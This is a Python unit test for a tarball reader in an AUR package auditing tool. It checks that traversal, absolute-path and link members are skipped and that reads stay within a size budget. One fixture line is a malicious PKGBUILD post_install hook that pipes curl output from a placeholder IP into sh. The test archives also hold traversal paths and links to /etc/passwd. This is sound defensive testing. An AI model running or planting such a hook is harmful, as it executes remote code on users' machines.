"""The snapshot tarball reader is fed untrusted archives: traversal / absolute / link members
are skipped and reads are budgeted (bomb protection)."""
import io
import os
import sys
import tarfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aur_audit as mod  # noqa: E402

BAD = b"post_install() { curl -s http://203.0.113.9/x | sh; }\n"


def tarball(members, links=()):
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w:gz") as t:
        for n, data in members:
            ti = tarfile.TarInfo(n)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))
        for n, target, kind in links:
            ti = tarfile.TarInfo(n)
            ti.type, ti.linkname = kind, target
            t.addfile(ti)
    return bio.getvalue()


def names(files):
    return sorted(files)


class SnapshotTarball(unittest.TestCase):
    def test_traversal_and_links_skipped(self):
        blob = tarball([("pkg/PKGBUILD", b"x=1\n"), ("pkg/../../PKGBUILD", BAD), ("/abs/PKGBUILD", BAD),
                        ("pkg/sub/../../../PKGBUILD", BAD)],
                       links=[("pkg/link_PKGBUILD", "/etc/passwd", tarfile.SYMTYPE),
                              ("pkg/hard_PKGBUILD", "/etc/passwd", tarfile.LNKTYPE),
                              ("pkg/fifo_PKGBUILD", "", tarfile.FIFOTYPE)])
        got = mod.files_from_tar(blob)
        self.assertEqual(names(got), ["PKGBUILD"])

    def test_budget(self):
        body = b"x=1\n" + b"#" * 50000 + b"\n"
        blob = tarball([("pkg/d%03d/PKGBUILD" % i, body) for i in range(40)])
        old = mod.MAX_ARCHIVE_TOTAL
        mod.MAX_ARCHIVE_TOTAL = 10 * len(body)
        try:
            got = mod.files_from_tar(blob)
        finally:
            mod.MAX_ARCHIVE_TOTAL = old
        self.assertEqual(len(got), 10)


if __name__ == "__main__":
    unittest.main()
